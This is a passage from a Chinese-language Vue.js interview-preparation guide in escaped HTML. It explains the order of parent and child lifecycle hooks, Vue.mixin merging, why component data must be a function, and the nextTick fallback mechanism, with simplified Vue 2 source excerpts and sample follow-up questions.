的父子组件生命周期钩子函数执行顺序</h3>\\n<ul>\\n<li><strong>渲染顺序</strong>：先父后子，完成顺序：先子后父</li>\\n<li><strong>更新顺序</strong>：父更新导致子更新，子更新完成后父</li>\\n<li><strong>销毁顺序</strong>：先父后子，完成顺序：先子后父</li>\\n</ul>\\n<p><strong>加载渲染过程</strong></p>\\n<p>父 <code>beforeCreate</code>-&gt;父 <code>created</code>-&gt;父 <code>beforeMount</code>-&gt;子 <code>beforeCreate</code>-&gt;子 <code>created</code>-&gt;子 <code>beforeMount</code>-&gt;子 <code>mounted</code>-&gt;父 <code>mounted</code>。<strong>子组件先挂载，然后到父组件</strong></p>\\n<p><strong>子组件更新过程</strong></p>\\n<p>父 <code>beforeUpdate</code>-&gt;子 <code>beforeUpdate</code>-&gt;子 <code>updated</code>-&gt;父 <code>updated</code></p>\\n<p><strong>父组件更新过程</strong></p>\\n<p>父 <code>beforeUpdate</code>-&gt;父 <code>updated</code></p>\\n<p><strong>销毁过程</strong></p>\\n<p>父 <code>beforeDestroy</code>-&gt;子 <code>beforeDestroy</code>-&gt;子 <code>destroyed</code>-&gt;父 <code>destroyed</code></p>\\n<blockquote>\\n<p>之所以会这样是因为<code>Vue</code>创建过程是一个递归过程，先创建父组件，有子组件就会创建子组件，因此创建时先有父组件再有子组件；子组件首次创建时会添加<code>mounted</code>钩子到队列，等到<code>patch</code>结束再执行它们，可见子组件的<code>mounted</code>钩子是先进入到队列中的，因此等到<code>patch</code>结束执行这些钩子时也先执行。</p>\\n</blockquote>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/c0e24e4114c32a12.png\\" alt=\\"\\"></p>\\n<pre class=\\"language-js\\"><code>function patch (oldVnode, vnode, hydrating, removeOnly) { \\n    if (isUndef(vnode)) { \\n      if (isDef(oldVnode)) invokeDestroyHook(oldVnode) return \\n    }\\n    let isInitialPatch = false \\n    const insertedVnodeQueue = [] // 定义收集所有组件的insert hook方法的数组 // somthing ... \\n    createElm( \\n        vnode, \\n        insertedVnodeQueue, oldElm._leaveCb ? null : parentElm, \\n        nodeOps.nextSibling(oldElm) \\n    )// somthing... \\n    // 最终会依次调用收集的insert hook \\n    invokeInsertHook(vnode, insertedVnodeQueue, isInitialPatch);\\n    return vnode.elm\\n}\\n\\nfunction createElm ( vnode, insertedVnodeQueue, parentElm, refElm, nested, ownerArray, index ) { \\n    // createChildren 会递归创建儿子组件 \\n    createChildren(vnode, children, insertedVnodeQueue) // something... \\n} \\n// 将组件的vnode插入到数组中 \\nfunction invokeCreateHooks (vnode, insertedVnodeQueue) { \\n    for (let i = 0; i &lt; cbs.create.length; ++i) { \\n        cbs.create[i](emptyNode, vnode) \\n    }\\n    i = vnode.data.hook // Reuse variable \\n    if (isDef(i)) { \\n        if (isDef(i.create)) i.create(emptyNode, vnode) \\n        if (isDef(i.insert)) insertedVnodeQueue.push(vnode) \\n    } \\n} \\n// insert方法中会依次调用mounted方法 \\ninsert (vnode: MountedComponentVNode) { \\n    const { context, componentInstance } = vnode \\n    if (!componentInstance._isMounted) { \\n        componentInstance._isMounted = true \\n        callHook(componentInstance, &#39;mounted&#39;) \\n    } \\n}\\nfunction invokeInsertHook (vnode, queue, initial) { \\n    // delay insert hooks for component root nodes, invoke them after the // element is really inserted \\n    if (isTrue(initial) &amp;&amp; isDef(vnode.parent)) { \\n        vnode.parent.data.pendingInsert = queue \\n    } else { \\n        for (let i = 0; i &lt; queue.length; ++i) { \\n            queue[i].data.hook.insert(queue[i]); // 调用insert方法 \\n        } \\n    } \\n}\\n\\nVue.prototype.$destroy = function () { \\n    callHook(vm, &#39;beforeDestroy&#39;) \\n    // invoke destroy hooks on current rendered tree \\n    vm.__patch__(vm._vnode, null) // 先销毁儿子 \\n    // fire destroyed hook \\n    callHook(vm, &#39;destroyed&#39;) \\n}\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>父组件的 <code>beforeMount</code> 已经执行，候选人就认为子组件也完成了挂载；在包含一个子表格的页面里，这个判断为什么不成立？</strong></p>\\n<p>父 <code>beforeMount</code> 之后才会进入子组件的创建与挂载流程，此时子表格尚未执行 <code>mounted</code>。首次渲染遵循父先开始、子先完成：子 <code>mounted</code> 执行后才轮到父 <code>mounted</code>，因此不能把父的挂载前钩子当成整棵子树已就绪。</p>\\n</li>\\n<li>\\n<p><strong>父页面需要在所有直接子组件挂载后读取它们的渲染结果，这段逻辑放在父 <code>created</code> 还是父 <code>mounted</code> 更合适？</strong></p>\\n<p>应放在父 <code>mounted</code>，因为子组件的 <code>mounted</code> 会先进入队列并先执行，随后才完成父组件挂载。父 <code>created</code> 发生在子组件创建之前，无法保证子树已生成；若子组件内部还有异步任务，父 <code>mounted</code> 也只代表同步挂载完成。</p>\\n</li>\\n<li>\\n<p><strong>一次状态变更只修改父组件标题，没有把新数据传给子组件，日志里应该出现哪些更新钩子？</strong></p>\\n<p>按给定场景只触发父组件自身更新，顺序是父 <code>beforeUpdate</code> 后接父 <code>updated</code>。只有父更新进一步导致子组件更新时，才会形成父 <code>beforeUpdate</code>、子 <code>beforeUpdate</code>、子 <code>updated</code>、父 <code>updated</code>；是否波及子组件要以实际依赖为准。</p>\\n</li>\\n<li>\\n<p><strong>线上销毁一个含子播放器的父页面时，日志显示父 <code>destroyed</code> 早于子 <code>destroyed</code>，你会如何判断和排查？</strong></p>\\n<p>这与给出的正常销毁顺序不符，预期是父 <code>beforeDestroy</code>、子 <code>beforeDestroy</code>、子 <code>destroyed</code>、父 <code>destroyed</code>。先确认日志是否来自同一组件实例以及是否被异步输出打乱，再检查播放器是否脱离了该父子树；不能仅凭相同组件名拼接时序。</p>\\n</li>\\n<li>\\n<p><strong>为什么首次渲染不是父组件先执行 <code>mounted</code>，再轮到子组件？请结合 <code>patch</code> 队列解释？</strong></p>\\n<p>创建过程会递归执行 <code>createChildren</code>，子组件对应的 <code>insert</code> 钩子先被加入 <code>insertedVnodeQueue</code>。<code>patch</code> 结束后，<code>invokeInsertHook</code> 按队列调用 <code>insert</code>，再触发组件的 <code>mounted</code>，所以子组件先完成；这一解释依赖给出的 <code>Vue</code> 2 风格实现，不能直接套到未核对的其他实现。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_11-vue-mixin的使用场景和原理\\"><a class=\\"header-anchor\\" href=\\"#_11-vue-mixin的使用场景和原理\\">#</a> 11 Vue.mixin的使用场景和原理</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>mixin</code> 把一组选项（<code>data</code>/<code>methods</code>/生命周期）合并进组件，用于复用逻辑</li>\\n<li>合并策略不同：<code>data</code> 递归合并（<strong>组件优先</strong>）、生命周期钩子合并成<strong>数组依次调用</strong>（mixin 先执行）、<code>methods</code>/<code>computed</code> 同名时<strong>组件覆盖 mixin</strong></li>\\n<li>三个致命问题：<strong>来源不明</strong>（看到 <code>this.xxx</code> 不知道哪来的）、<strong>命名冲突</strong>（多个 mixin 同名会静默覆盖）、<strong>隐式依赖</strong>（mixin 依赖组件里某个字段）</li>\\n<li><code>Vue.mixin()</code> 全局混入会影响<strong>每一个</strong>组件，包括第三方组件，基本不该用</li>\\n<li><code>Vue 3</code> 的组合式函数是它的替代品：显式调用、显式解构、来源一目了然</li>\\n</ul>\\n<p><strong><code>mixin</code> 用来把公共的状态、方法和生命周期逻辑合并到组件中，本质是组件初始化时调用 <code>mergeOptions</code>。</strong> 不同选项采用不同合并策略：数据冲突时以组件为准，生命周期钩子会保留并依次执行，普通选项则按对应策略处理。它适合复用相对独立的公共逻辑，但容易出现命名冲突、隐式依赖和数据来源不清。<code>Vue 3</code> 中通常更适合改用组合式函数，因为依赖、返回值和调用来源都更显式。</p>\\n</section>\\n<blockquote>\\n<p><strong>版本说明</strong>：<code>mixin</code> 是 <strong>Vue 2</strong> 复用逻辑的主要手段，但缺陷明显（命名冲突、依赖不清、数据来源不明——和 React 的 mixin 是同一类问题）。<strong>Vue 3 用「组合式函数（composable）」取代了它</strong>：把复用逻辑抽成一个 <code>useXxx()</code> 函数，内部用 <code>ref</code>/<code>computed</code>/生命周期钩子，返回需要的状态和方法。组合式函数没有 mixin 的命名冲突（返回值可自由命名解构）、依赖和来源都显式，是 Vue 3 逻辑复用的主线答案。面试若不限定版本，应先讲组合式函数、再把 mixin 作为「Vue 2 的旧方案及其缺陷」对照。</p>\\n</blockquote>\\n<ul>\\n<li>在日常的开发中，我们经常会遇到在不同的组件中经常会需要用到一些相同或者相似的代码，这些代码的功能相对独立，可以通过 <code>Vue</code> 的 <code>mixin</code> 功能抽离公共的业务逻辑，原理类似“对象的继承”，当组件初始化时会调用 <code>mergeOptions</code> 方法进行合并，采用策略模式针对不同的属性进行合并。当组件和混入对象含有同名选项时，这些选项将以恰当的方式进行“合并”；如果混入的数据和本身组件的数据冲突，会以组件的数据为准</li>\\n<li><code>mixin</code>有很多缺陷如：命名冲突、依赖问题、数据来源问题（<strong>Vue 3 的组合式函数正是为解决这些而生</strong>）</li>\\n</ul>\\n<p>基本使用</p>\\n<pre class=\\"language-html\\"><code>&lt;script&gt;\\n    // Vue.options\\n    Vue.mixin({ // 如果他是对象 每个组件都用mixin里的对象进行合并\\n        data(){\\n            return {a: 1,b: 2}\\n        }\\n    });\\n    // Vue.extend\\n    Vue.component(&#39;my&#39;,{ // 组件必须是函数 Vue.extend  =&gt; render(xxx)\\n        data(){\\n            return {x:1}\\n        }\\n    }) \\n    // 没有 new 没有实例  _init()\\n    // const vm = this\\n    new Vue({\\n        el:&#39;#app&#39;,\\n        data(){ // 根可以不是函数 \\n            return {c:3}\\n        }\\n    })\\n&lt;/script&gt;\\n</code></pre>\\n<p>相关源码</p>\\n<pre class=\\"language-js\\"><code>export default function initMixin(Vue){\\n  Vue.mixin = function (mixin) {\\n    //   合并对象\\n      this.options=mergeOptions(this.options,mixin)\\n  };\\n}\\n};\\n\\n// src/util/index.js\\n// 定义生命周期\\nexport const LIFECYCLE_HOOKS = [\\n  &quot;beforeCreate&quot;,\\n  &quot;created&quot;,\\n  &quot;beforeMount&quot;,\\n  &quot;mounted&quot;,\\n  &quot;beforeUpdate&quot;,\\n  &quot;updated&quot;,\\n  &quot;beforeDestroy&quot;,\\n  &quot;destroyed&quot;,\\n];\\n\\n// 合并策略\\nconst strats = {};\\n// mixin核心方法\\nexport function mergeOptions(parent, child) {\\n  const options = {};\\n  // 遍历父亲\\n  for (let k in parent) {\\n    mergeFiled(k);\\n  }\\n  // 父亲没有 儿子有\\n  for (let k in child) {\\n    if (!parent.hasOwnProperty(k)) {\\n      mergeFiled(k);\\n    }\\n  }\\n\\n  //真正合并字段方法\\n  function mergeFiled(k) {\\n    // strats合并策略\\n    if (strats[k]) {\\n      options[k] = strats[k](parent[k], child[k]);\\n    } else {\\n      // 默认策略\\n      options[k] = child[k] ? child[k] : parent[k];\\n    }\\n  }\\n  return options;\\n}\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>两个 <code>Vue</code> 2 <code>mixin</code> 都提供了 <code>status</code>，组件自身也声明了同名数据；订单页最终应该以谁的值为准，为什么这仍是风险？</strong></p>\\n<p>当混入数据与组件自身数据冲突时，以组件数据为准，但不同选项并非全部采用同一种覆盖规则。<code>mergeOptions</code> 会按字段选择合并策略，默认字段再决定取父或子值；名称冲突虽可能有确定结果，来源不清和静默覆盖仍会增加维护风险。</p>\\n</li>\\n<li>\\n<p><strong>一个 <code>Vue</code> 2 项目有二十个表单组件共享校验状态，你会怎样判断该抽局部 <code>mixin</code> 还是注册全局 <code>Vue.mixin</code>？</strong></p>\\n<p>只服务这批表单时应优先局部复用，避免让无关组件也参与选项合并。全局 <code>Vue.mixin</code> 会把混入内容合到全局选项并影响后续组件，适合真正横跨所有组件的逻辑；覆盖面越大，命名冲突和隐式依赖的代价越高。</p>\\n</li>\\n<li>\\n<p><strong>团队把 <code>Vue</code> 2 的列表 <code>mixin</code> 迁到 <code>Vue</code> 3，新代码仍靠多个同名选项合并；你会要求改成什么结构？</strong></p>\\n<p>应优先提取为 <code>useXxx()</code> 组合式函数，在函数内部使用 <code>ref</code>、<code>computed</code> 和生命周期钩子，并显式返回状态与方法。调用方可在解构时自行命名，依赖和来源也能直接看到；只有受旧代码约束时才保留 <code>mixin</code>，并控制迁移范围。</p>\\n</li>\\n<li>\\n<p><strong>线上组件突然多执行了一段 <code>created</code> 逻辑，但组件文件里找不到；你会从哪里查起？</strong></p>\\n<p>先检查组件的局部混入以及是否注册过全局 <code>Vue.mixin</code>，再查看初始化时 <code>mergeOptions</code> 后的选项来源。生命周期字段有专门的合并策略，不能按普通字段覆盖来推断；还应确认第三方插件是否间接注册了全局混入。</p>\\n</li>\\n<li>\\n<p><strong>一个公共逻辑既能写成 <code>Vue</code> 2 <code>mixin</code>，也能复制到每个组件里，为什么合并机制并不足以证明 <code>mixin</code> 更优？</strong></p>\\n<p><code>mixin</code> 能减少重复，并在组件初始化时通过 <code>mergeOptions</code> 统一合并，但它同时隐藏了数据和方法的来源。复制代码的维护成本更高，混入的冲突与依赖成本也真实存在；在 <code>Vue</code> 3 中应优先用显式的组合式函数化解这组矛盾。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_12-vue组件data为什么必须是个函数\\"><a class=\\"header-anchor\\" href=\\"#_12-vue组件data为什么必须是个函数\\">#</a> 12 Vue组件data为什么必须是个函数？</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>因为组件会被<strong>复用多次</strong>，每次都是用同一个构造函数 <code>new</code> 出新实例</li>\\n<li>如果 <code>data</code> 是对象，对象是引用类型，所有实例共用同一份，改一个全都变</li>\\n<li>写成函数后每次实例化都调用一次，返回全新对象，实例之间互不影响</li>\\n<li><strong>根实例可以是对象</strong>，因为它是单例，不存在共享问题</li>\\n<li><code>Vue 3</code> 的 <code>setup()</code> 本身每个实例执行一次，数据天然独立 —— 这个规则被语法结构自然解决了</li>\\n</ul>\\n<p><strong>组件的 <code>data</code> 必须是函数，是为了让每个组件实例拿到一份独立的数据。</strong> 同一个组件可能被复用多次，如果直接写对象，多个实例会共享同一个引用，修改其中一个就会影响其他实例。写成函数后，每次创建实例都会返回新对象，数据自然互不干扰。根实例通常只有一个，所以 <code>data</code> 可以是对象；在 <code>Vue 3</code> 的组合式 <code>API</code> 中，<code>setup()</code> 会按实例执行，内部数据同样天然隔离。</p>\\n</section>\\n<p>一句话答案：<strong>为了让每个组件实例拥有独立的数据副本。</strong></p>\\n<p><strong>根本原因在于组件的复用机制。</strong> 一个 <code>.vue</code> 组件被使用多次，实际上是用同一个构造函数（<code>Vue.extend</code> 产出的子类）<code>new</code> 出多个实例：</p>\\n<pre class=\\"language-js\\"><code>const Child = Vue.extend({ data: { count: 0 } })   // 假设 data 是对象\\nconst a = new Child()\\nconst b = new Child()\\na.count = 100\\nb.count   // 100 ❌ —— 两个实例共享了同一个对象引用\\n</code></pre>\\n<p>对象是引用类型，写在选项里就是<strong>所有实例共用同一份</strong>。改成函数之后，每次实例化都调用一次，返回全新的对象：</p>\\n<pre class=\\"language-js\\"><code>const Child = Vue.extend({ data() { return { count: 0 } } })\\nconst a = new Child(), b = new Child()\\na.count = 100\\nb.count   // 0 ✅ 互不影响\\n</code></pre>\\n<p><strong>为什么根实例可以用对象？</strong></p>\\n<p>因为根实例是<strong>单例</strong> —— <code>new Vue({ data: {...} })</code> 全局只创建一次，不存在&quot;多个实例共享&quot;的问题，所以 <code>Vue</code> 没有强制它必须是函数。</p>\\n<p><strong><code>Vue</code> 是怎么强制这条规则的？</strong></p>\\n<p>源码里在初始化 <code>data</code> 时会判断类型，组件（非根实例）传对象会直接抛出警告：</p>\\n<pre class=\\"language-text\\"><code>data functions should return an object\\n</code></pre>\\n<p><strong>举一反三：<code>Vue 3</code> 里还有这个要求吗？</strong></p>\\n<p>有。<code>Options API</code> 里 <code>data</code> 仍必须是函数，原因完全一样。而组合式 API 的 <code>setup()</code> 本身就是每个实例执行一次，里面 <code>ref</code>/<code>reactive</code> 创建的数据天然独立 —— 这个规则被语法结构自然地解决掉了，不再需要靠约定。</p>\\n<p>下面是简化版的组件创建流程，能看清&quot;同一个构造函数 new 多次&quot;这件事：</p>\\n<ul>\\n<li><strong>根实例对象<code>data</code>可以是对象也可以是函数</strong>（根实例是单例），不会产生数据污染情况</li>\\n<li><strong>组件实例对象<code>data</code>必须为函数</strong> <code>.vue</code>文件在使用的时候实际上会转换成一个<code>class</code>，一个组件被复用多次的话，也就会创建多个实例。本质上，这些实例用的都是同一个构造函数。如果<code>data</code>是对象的话，对象属于引用类型，会影响到所有的实例。所以为了保证组件在不同的实例之间<code>data</code>不冲突，<code>data</code>必须是一个函数，</li>\\n</ul>\\n<p><strong>简版理解</strong></p>\\n<pre class=\\"language-js\\"><code>// 1.组件的渲染流程 调用Vue.component -&gt; Vue.extend -&gt; 子类 -&gt; new 子类\\n// Vue.extend 根据用户定义产生一个新的类\\nfunction Vue() {}\\nfunction Sub() { // 会将data存起来\\n    this.data = this.constructor.options.data();\\n}\\nVue.extend = function(options) {\\n    Sub.options = options; // 静态属性\\n    return Sub;\\n}\\nlet Child = Vue.extend({\\n    data:()=&gt;( { name: &#39;test&#39; })\\n});\\n\\n// 两个组件就是两个实例, 希望数据互不感染\\nlet child1 = new Child();\\nlet child2 = new Child();\\n\\nconsole.log(child1.data.name);\\nchild1.data.name = &#39;poetry&#39;;\\nconsole.log(child2.data.name);\\n\\n// 根不需要 任何的合并操作   根才有vm属性 所以他可以是函数和对象  但是组件mixin他们都没有vm 所以我就可以判断 当前data是不是个函数\\n</code></pre>\\n<p><strong>相关源码</strong></p>\\n<pre class=\\"language-js\\"><code>// 源码位置 src/core/global-api/extend.js\\nexport function initExtend (Vue: GlobalAPI) {\\n  Vue.extend = function (extendOptions: Object): Function {\\n    extendOptions = extendOptions || {}\\n    const Super = this\\n    const SuperId = Super.cid\\n    const cachedCtors = extendOptions._Ctor || (extendOptions._Ctor = {})\\n    if (cachedCtors[SuperId]) {\\n      return cachedCtors[SuperId]\\n    }\\n\\n    const name = extendOptions.name || Super.options.name\\n    if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; name) {\\n      validateComponentName(name)\\n    }\\n\\n    const Sub = function VueComponent (options) {\\n      this._init(options)\\n    }\\n    // 子类继承大Vue父类的原型\\n    Sub.prototype = Object.create(Super.prototype)\\n    Sub.prototype.constructor = Sub\\n    Sub.cid = cid++\\n    Sub.options = mergeOptions(\\n      Super.options,\\n      extendOptions\\n    )\\n    Sub[&#39;super&#39;] = Super\\n\\n    // For props and computed properties, we define the proxy getters on\\n    // the Vue instances at extension time, on the extended prototype. This\\n    // avoids Object.defineProperty calls for each instance created.\\n    if (Sub.options.props) {\\n      initProps(Sub)\\n    }\\n    if (Sub.options.computed) {\\n      initComputed(Sub)\\n    }\\n\\n    // allow further extension/mixin/plugin usage\\n    Sub.extend = Super.extend\\n    Sub.mixin = Super.mixin\\n    Sub.use = Super.use\\n\\n    // create asset registers, so extended classes\\n    // can have their private assets too.\\n    ASSET_TYPES.forEach(function (type) {\\n      Sub[type] = Super[type]\\n    })\\n    // enable recursive self-lookup\\n    if (name) { \\n      Sub.options.components[name] = Sub // 记录自己 在组件中递归自己  -&gt; jsx\\n    }\\n\\n    // keep a reference to the super options at extension time.\\n    // later at instantiation we can check if Super&#39;s options have\\n    // been updated.\\n    Sub.superOptions = Super.options\\n    Sub.extendOptions = extendOptions\\n    Sub.sealedOptions = extend({}, Sub.options)\\n\\n    // cache constructor\\n    cachedCtors[SuperId] = Sub\\n    return Sub\\n  }\\n}\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>商品卡片组件被渲染两次，<code>data</code> 如果直接写成 <code>{ count: 0 }</code>，点击第一张卡后第二张也变成 <code>1</code>，根因是什么？</strong></p>\\n<p>两个组件实例来自同一个构造函数，选项中的对象会让它们持有同一引用，所以一次修改会污染另一实例。把 <code>data</code> 写成返回对象的函数后，每次实例化都会获得独立副本；函数若仍返回同一个外部对象，问题依然存在。</p>\\n</li>\\n<li>\\n<p><strong>一个列表同时渲染上百个相同子组件，怎样写 <code>data</code> 才能保证每行编辑状态互不影响？</strong></p>\\n<p>应写成 <code>data() { return { editing: false } }</code>，让每个子组件实例在初始化时创建自己的状态对象。规模大小不改变规则，只会让共享引用的影响更明显；真正需要共享的数据应通过明确的共享状态方案管理，而不是借用错误的 <code>data</code> 写法。</p>\\n</li>\\n<li>\\n<p><strong>根实例以前使用对象形式的 <code>data</code>，拆成可复用组件后还能原样保留吗？</strong></p>\\n<p>不能默认保留，因为根实例是单例，而可复用组件会由同一个 <code>Vue.extend</code> 子类创建多个实例。拆分后应改成函数返回对象；<code>Vue</code> 3 的 <code>Options API</code> 仍有同样要求，只有 <code>setup()</code> 内创建的状态天然按实例执行。</p>\\n</li>\\n<li>\\n<p><strong>代码已经写成 <code>data() { return sharedState }</code>，但两个弹窗仍然互相修改字段，你会怎样排查？</strong></p>\\n<p>语法虽然是函数，返回值却仍指向同一个模块级 <code>sharedState</code>，所以实例没有真正获得独立副本。应让函数内部创建新对象，并继续检查嵌套对象是否也被外部共享；若共享是业务意图，就应显式标注为共享状态。</p>\\n</li>\\n<li>\\n<p><strong><code>Vue</code> 3 页面用 <code>setup()</code> 重写后，两个组件实例仍共享一个 <code>reactive</code> 对象，这是否推翻了“组合式 <code>API</code> 天然独立”？</strong></p>\\n<p>不推翻，关键在响应式对象创建的位置。<code>setup()</code> 每个实例执行一次，函数内部创建的 <code>ref</code> 或 <code>reactive</code> 默认独立；若对象定义在模块顶层或组合式函数外，它就是共享引用，这可能是全局状态设计，也可能是边界放错。</p>\\n</li>\\n<li>\\n<p><strong>为什么 <code>Vue.extend</code> 能解释组件 <code>data</code> 的函数约束，而不能只用“框架规定如此”作答？</strong></p>\\n<p><code>Vue.extend</code> 会基于同一组选项生成子类，多个组件节点再通过同一个子类构造出不同实例。对象形式的数据挂在共享选项上，而函数能在每次实例初始化时生成新对象；这揭示了约束来自实例复用和引用语义，而非单纯语法偏好。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_13-nexttick在哪里使用-原理是\\"><a class=\\"header-anchor\\" href=\\"#_13-nexttick在哪里使用-原理是\\">#</a> 13 nextTick在哪里使用？原理是？</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>用途：<strong>数据改完之后想立刻读到更新后的 <code>DOM</code></strong>（量高度、定位、聚焦输入框、调第三方图表 resize）</li>\\n<li>原理：<code>Vue</code> 的更新是异步批量的 —— 数据变只是把 <code>Watcher</code> 推进队列，同步代码跑完后在<strong>微任务</strong>里统一 flush</li>\\n<li>所以同步读到的还是旧 <code>DOM</code>；<code>nextTick</code> 的回调排在 flush 之后，那时 <code>DOM</code> 才是新的</li>\\n<li>降级策略：<code>Promise.then</code> → <code>MutationObserver</code> → <code>setImmediate</code> → <code>setTimeout(0)</code>，优先用微任务</li>\\n<li>⚠️ 自己写 <code>Promise.resolve().then()</code> 不等价 —— 谁先谁后取决于注册顺序，写在数据修改之前就会跑在更新之前</li>\\n</ul>\\n<p><strong><code>nextTick</code> 用在修改响应式数据后，需要读取最新 <code>DOM</code> 的场景。</strong> <code>Vue</code> 不会同步更新视图，而是把 <code>Watcher</code> 放进队列，等当前同步代码执行完后再批量刷新，所以马上读取的还是旧 <code>DOM</code>。<code>nextTick</code> 的回调会排在更新任务之后，适合测量高度、定位元素或聚焦输入框。它优先通过 <code>Promise</code> 等微任务实现，再依次降级到 <code>MutationObserver</code>、<code>setImmediate</code> 和 <code>setTimeout</code>。</p>\\n</section>\\n<ul>\\n<li><code>nextTick</code> 中的回调是在下次 <code>DOM</code> 更新循环结束之后执行延迟回调，用于获得更新后的 <code>DOM</code></li>\\n<li>在修改数据之后立即使用这个方法，获取更新后的 <code>DOM</code></li>\\n<li>主要思路就是采用<code>微任务优先</code>的方式调用异步方法去执行 <code>nextTick</code> 包装的方法</li>\\n</ul>\\n<blockquote>\\n<p><code>nextTick</code> 方法主要是使用了宏任务和微任务,定义了一个异步方法.多次调用 <code>nextTick</code> 会将方法存入队列中，通过这个异步方法清空当前队列。所以这个 <code>nextTick</code> 方法就是异步方法</p>\\n</blockquote>\\n<p><strong>根据执行环境分别尝试采用</strong></p>\\n<ul>\\n<li>先采用<code>Promise</code></li>\\n<li><code>Promise</code>不支持，再采用<code>MutationObserver</code></li>\\n<li><code>MutationObserver</code>不支持，再采用<code>setImmediate</code></li>\\n<li>如果以上都不行则采用<code>setTimeout</code></li>\\n<li>最后执行<code>flushCallbacks</code>，把<code>callbacks</code>里面的数据依次执行</li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/dbe8ffb2bbf12d38.png\\" alt=\\"\\"></p>\\n<div class=\\"tip\\">\\n<ol>\\n<li><code>nextTick</code> 中的回调是在下次 <code>DOM</code> 更新循环结束之后执行延迟回调，用于获得更新后的 <code>DOM</code></li>\\n<li><code>Vue</code>有个异步更新策略，意思是如果数据变化，<code>Vue</code>不会立刻更新DOM，而是开启一个队列，把组件更新函数保存在队列中，在同一事件循环中发生的所有数据变更会异步的批量更新。这一策略导致我们对数据的修改不会立刻体现在DOM上，此时如果想要获取更新后的DOM状态，就需要使用<code>nextTick</code></li>\\n<li>开发时，有两个场景我们会用到<code>nextTick</code></li>\\n</ol>\\n<ul>\\n<li><code>created</code>中想要获取<code>DOM</code>时</li>\\n<li>响应式数据变化后获取<code>DOM</code>更新后的状态，比如希望获取列表更新后的高度</li>\\n</ul>\\n<ol start=\\"4\\">\\n<li><code>nextTick</code>签名如下：<code>function nextTick(callback?: () =&gt; void): Promise&lt;void&gt;</code></li>\\n</ol>\\n<p>所以我们只需要在传入的回调函数中访问最新DOM状态即可，或者我们可以<code>await nextTick()</code>方法返回的<code>Promise</code>之后做这件事</p>\\n<ol start=\\"5\\">\\n<li>在<code>Vue</code>内部，<code>nextTick</code>之所以能够让我们看到DOM更新后的结果，是因为我们传入的<code>callback</code>会被添加到队列刷新函数(<code>flushSchedulerQueue</code>)的后面，这样等队列内部的更新函数都执行完毕，所有DOM操作也就结束了，<code>callback</code>自然能够获取到最新的DOM值</li>\\n</ol>\\n</div>\\n<p>基本使用</p>\\n<pre class=\\"language-js\\"><code>const vm = new Vue({\\n    el: &#39;#app&#39;,\\n    data() {\\n        return { a: 1 }\\n    }\\n}); \\n\\n// vm.$nextTick(() =&gt; {// [nextTick回调函数fn,内部更新flushSchedulerQueue]\\n//     console.log(vm.$el.innerHTML)\\n// })\\n\\n// 是将内容维护到一个数组里，最终按照顺序顺序。 第一次会开启一个异步任务\\n\\nvm.a = &#39;test&#39;; // 修改了数据后并不会马上更新视图\\nvm.$nextTick(() =&gt; {// [nextTick回调函数fn,内部更新flushSchedulerQueue]\\n    console.log(vm.$el.innerHTML)\\n})\\n\\n// nextTick中的方法会被放到 更新页面watcher的后面去\\n</code></pre>\\n<p>相关代码如下</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/336264b6b10bd324.png\\" alt=\\"\\"></p>\\n<pre class=\\"language-js\\"><code>// src/core/utils/nextTick\\nlet callbacks = [];\\nlet pending = false;\\nfunction flushCallbacks() {\\n  pending = false; //把标志还原为false\\n  // 依次执行回调\\n  for (let i = 0; i &lt; callbacks.length; i++) {\\n    callbacks[i]();\\n  }\\n}\\nlet timerFunc; //定义异步方法  采用优雅降级\\nif (typeof Promise !== &quot;undefined&quot;) {\\n  // 如果支持promise\\n  const p = Promise.resolve();\\n  timerFunc = () =&gt; {\\n    p.then(flushCallbacks);\\n  };\\n} else if (typeof MutationObserver !== &quot;undefined&quot;) {\\n  // MutationObserver 主要是监听dom变化 也是一个异步方法\\n  let counter = 1;\\n  const observer = new MutationObserver(flushCallbacks);\\n  const textNode = document.createTextNode(String(counter));\\n  observer.observe(textNode, {\\n    characterData: true,\\n  });\\n  timerFunc = () =&gt; {\\n    counter = (counter + 1) % 2;\\n    textNode.data = String(counter);\\n  };\\n} else if (typeof setImmediate !== &quot;undefined&quot;) {\\n  // 如果前面都不支持 判断setImmediate\\n  timerFunc = () =&gt; {\\n    setImmediate(flushCallbacks);\\n  };\\n} else {\\n  // 最后降级采用setTimeout\\n  timerFunc = () =&gt; {\\n    setTimeout(flushCallbacks, 0);\\n  };\\n}\\n\\nexport function nextTick(cb) {\\n  // 除了渲染watcher  还有用户自己手动调用的nextTick 一起被收集到数组\\n  callbacks.push(cb);\\n  if (!pending) {\\n    // 如果多次调用nextTick  只会执行一次异步 等异步队列清空之后再把标志变为false\\n    pending = true;\\n    timerFunc();\\n  }\\n}\\n</code></pre>\\n<p>数据更新的时候内部会调用<code>nextTick</code></p>\\n<pre class=\\"language-js\\"><code>// src/core/observer/scheduler.js\\n\\nexport function queueWatcher (watcher: Watcher) {\\n  const id = watcher.id\\n  if (has[id] == null) {\\n    has[id] = true\\n    if (!flushing) {\\n      queue.push(watcher)\\n    } else {\\n      // if already flushing, splice the watcher based on its id\\n      // if already past its id, it will be run next immediately.\\n      let i = queue.length - 1\\n      while (i &gt; index &amp;&amp; queue[i].id &gt; watcher.id) {\\n        i--\\n      }\\n      queue.splice(i + 1, 0, watcher)\\n    }\\n    // queue the flush\\n    if (!waiting) {\\n      waiting = 